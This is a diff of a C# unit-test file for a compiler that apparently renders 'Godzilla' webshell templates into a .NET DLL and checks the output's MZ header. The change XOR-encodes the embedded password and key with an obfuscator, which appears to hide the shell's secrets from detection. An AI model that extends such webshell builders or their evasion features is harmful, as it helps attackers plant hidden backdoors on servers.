@@ -9,12 +9,14 @@ public class CompilerTests
 {
     private string RenderVppSource(string pass = "test", string key = "0123456789abcdef")
     {
-        string quotedPass = "\"" + pass + "\"";
-        string quotedKey = "\"" + key + "\"";
+        byte xorKey = 0x2A;
         string members = GodzillaCSharp.MembersBlock
-            .Replace("{{PASSWORD}}", quotedPass).Replace("{{KEY}}", quotedKey);
+            .Replace("{{PASSWORD_ENC}}", Randomizer.StringObfuscator.Encode(pass, xorKey))
+            .Replace("{{KEY_ENC}}", Randomizer.StringObfuscator.Encode(key, xorKey))
+            .Replace("{{XOR_KEY}}", "0x2A");
         string trigger = GodzillaCSharp.TriggerBlock
-            .Replace("{{PASSWORD}}", quotedPass).Replace("{{KEY}}", quotedKey);
+            .Replace("{{PASSWORD}}", "\"" + pass + "\"")
+            .Replace("{{KEY}}", "\"" + key + "\"");
         string randomStr = GodzillaCSharp.RandomStringBlock;
 
         return VppTemplate.Source
@@ -33,9 +35,8 @@ public class CompilerTests
         var (success, dll, diags) = compiler.Compile(source, "net40");
         Assert.True(success, string.Join("\n", diags));
         Assert.True(dll.Length > 0);
-        // PE magic: MZ
-        Assert.Equal(0x4D, dll[0]); // 'M'
-        Assert.Equal(0x5A, dll[1]); // 'Z'
+        Assert.Equal(0x4D, dll[0]);
+        Assert.Equal(0x5A, dll[1]);
     }
 
     [Fact]
